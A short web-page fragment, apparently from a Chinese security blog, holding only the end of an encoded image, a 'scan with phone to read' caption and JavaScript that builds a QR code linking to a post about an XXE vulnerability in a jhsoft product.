FUAwBCdnWMYUWtggAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ArchivesRoomDeptSave-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 